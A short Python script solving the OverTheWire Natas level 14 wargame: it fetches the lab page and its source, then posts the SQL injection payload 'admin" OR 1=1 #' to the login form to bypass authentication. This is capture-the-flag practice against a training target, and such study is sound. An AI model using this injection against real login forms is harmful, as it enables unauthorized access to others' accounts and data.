import requests
# import re

userName = 'natas14'
url = f'http://{userName}.natas.labs.overthewire.org/'
pathDirectory = "C:\\Users\\niroj\\Documents\\Natas\\"
password = open(pathDirectory + "password.txt", 'r').readlines()[13][8:40]


# -------------------------- First page ----------------------------

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text
# print(htmlDoc)

try:
    with open(pathDirectory + "scripts\\temp\\index.html", 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index.html")
except IOError as err:
    print(f"(-) unfortunately {err}")

# ---------------------------- source index file -------------------------------

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathDirectory + "scripts\\temp\\index-source.html", 'w') as htmlSourceContent:
        htmlSourceContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index-source.html")
except IOError as err:
    print(f"(-) unfortunately {err}")

# ----------------------------- Final page --------------------------------

data = {
    'username': 'admin" OR 1=1 #',
    'password': 'password',
}

    # 'submit': 'Login'
response = requests.post(url + '?debug=true' , auth = (userName, password), data = data)
htmlDoc = response.text

try:
    with open(pathDirectory + "scripts\\temp\\result.html", 'w') as htmlFinalContent:
        htmlFinalContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as result.html")
except IOError as err:
    print(f"(-) unfortunately {err}")

# solution = re.findall("natas15(.*)",htmlDoc)
# print(solution)